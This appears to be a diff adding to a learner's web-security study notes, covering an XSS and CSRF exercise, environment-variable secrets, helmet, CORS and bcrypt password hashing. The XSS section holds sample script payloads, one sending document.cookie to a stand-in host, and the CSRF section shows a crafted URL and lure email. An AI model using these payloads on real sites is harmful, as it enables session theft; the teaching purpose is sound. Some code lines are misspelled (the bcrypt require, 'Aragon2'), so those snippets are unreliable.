@@ -318,17 +318,181 @@ Always validate your code with userinput.
 
 Exercise:#3- XSS + CSRF
 1. XSS
+
 Imagine you are the owner of breddit.com, the number one social media site for the baking industry. You have an avid community of commenters who love sharing their bread knowledge.
 
+breddit.com/r/comments/how_much_do_you_like_bread/
+
+How much do you guys like bread?
+
+roll_with_it
+I dream of baking tins.
+
+Because the main use of your website is to facilitate discussion, users can add comments, which are saved to the database and displayed to other users.
+
+How much do you guys like bread?
+roll_with_it
+I dream of baking tins.
+I_knead_you_right_now
+I love it so much, I think I might be part duck.
+
+Unfortunately the popularity of your site has also attracted the attention of hackers, who want to access your site for nefarious purposes.
+
+Unless you are careful when constructing the HTML, hackers can abuse the comment function by injecting JavaScript.
+
+Watch how Mal injects some malicious JavaScript.
+
+<script> alert('Your croissant are limp and sad.') </script>
+
+Rude.
+
+A real attack might use cross-site scripting to steal another user's cookie, which can permit session hijacking.
+
+<script> window.location = 'haxxed.com?cookie' + document.cookie </script>
+
+That's not good.
+
+Now you try. Inject a script tag to call the upvote() function whenever the page is viewed.
+
+<script> upvote()</script>
+
+2. CSRF
+
+When creating a website, we tend to code the client-side and the server-side together. We build the pages and forms a user will interact with on the client-side, then build the server-side URLs that respond when the user performs an action.
+
+However, requests can be triggered to the server-side code from anywhere - not just the client-side code we write. This is one of the most powerful aspects of how internet is designed: it allows linking between sites. But it also the cause of a common security flaw, CROSS-SITE REQUEST FORGERY (CSRF).
+
+A CSRF attack occurs when a user is tricked into interacting with a page or script on a third-party site that generates a malicious request to your site. All your server will see is an HTTP request from an authenticated user. However, an attacker takes control over the form of the data sent in the request to cause mischief.
+
+Imagine you run the micro-blogging service that allows your users to tweep their opinions at each other in 140-character-sized chunks.
+
+Mal is a hacker who has noticed that posts on your service are created using GET requests. This means that all the information is carried in the URL of the HTTP request.
+
+Mal modifies the post-creation URL to include a malicious payload. Now he has to find some way to get a victim to visit the URL in their browser.
+
+www.tweeper.com/post?message=This+horse+know+karate!+www%2Cbit.ly%2F60138Wawd
+
+Vic is one of your users. Mal has been able to guess his email address.
+
+Mal sends Vic an email with a very tempting link, pointing to the crafted URL.
+
+Subject: Has science gone too far?
+To: Vic
+Researchers have taught this horse how to do karate!
+
+That seems like a very dangerous thing to do.
+
+Vic clicks on the link.
+
+What if it starts teaching the other horses karate?
+
+Your server interprets the request as Vic writing a post, and creates a new item on his timeline. This is not the action that Vic intended, but he may not quite have noticed what just occurred.
+
+Wait - did I post that?
+
+The post is designed to be enticing enough that other users of your site will click on it. When they do, they will be tricked in the same way Vic was.
+
+You now have a worm on your site, as each user who clicks the link will open up a new set of potential victims. Bad news!
+
 Code Secrets
+With code secrets it is two things we wanna focus on.
+-Enviromental Variables
+-Commit History
+
+Many times in our app we want to hide informationen.
+Some times we wanna connect with an Database and hide information.
+
+In our React we have access to
+console.log(process.env.NODE_ENV).
+And this is sayin in that process we are running give me the 
+enviromental variable NODE_ENV.
+We have our logger development.
+Ohh we are running in developement let's set up the app 
+for development purposes.
+if(process.env.NODE_ENV === 'production'){
+}
+
+We now have the power to inject variables into the app from the outside world everything we can hide.
+We are doing this by create  an file named .env
+I can add anything i want.
+REACT_APP_SAY_HI=HIII.
+Securely add passwords and things.
+You can use it for API-key for example.
+Your are using an package named dotenv
+npm install dotenv --save
+Github has an commit history.
+You never ever want to have secrets in git commit history.
 
 Secure Headers
+To what to with the contents.
+Install package helmet. 
+npm install helmet.
+There exist packages that helps you with that.
+See that your page is used by express in the network page.
+Helmet helps to set the headers.
+Include the package Helmet.
+const helmet = require('helmet');
+app.use(helmet());
+Helmet sets everything and does all the configurations.
+Helmet covers a bunch of things.
 
 Access Control
+Let's talk about access control.
+Adds authentication to user.
+What's does the user access to.
+Prinicipal of least privilege.
+What happens when we dosen't use Cors.
+Error: No 'Access-Control-Allow-Origin'.
+Cors stands for: Cross origin resource sharing.
+I'don't have access for you to access the server.
+Maybe the server is only meant for me to be myself to access the server.
+Cors allows multiple users to gain access to the server.
+To give the access to the clients to the server.
+We are adding app.use(cors()).
+We wanna give at least access to the user.
+Good lists to give options as to check whitelist on websites.
 
 Data Management
+We are so close.
+How can we improve security in data management.
+We always want to have backups.
+You want limit your information with encryption.
+Encrypting all the data in transistion can be costly.
+You want to be selective of which data you uses.
+
+Hashing
+
+bcrypt, scrypt, Aragon2
+
+Decrypt your database
+pgcrypto- encrypt a few columns
+
+You want to do encryptions.
+You want to have back-ups.
+
+I actually love is password-storage.
+Every website that has some input-forms.
+These three has standed the time.
+
+const brycpt = require('brypt-nodejs');
+They have async and synchronous options.
+
+bcrypt.hash("soup",null,null, function(err,hash) {
+	
+});
+
+When they click submit you make it they puts in the body.
+We never store datebases with the actual password.
+We take the soup string and creates an hash of it.
+How can we check for example Tim comes back to the website that this is him.
+We use below
+
+bcrypt.compare('soup',hash, function(err,res){
+	console.log(res);	
+});	
 
 Don't trust Anyone
+
 
 Authentication
 
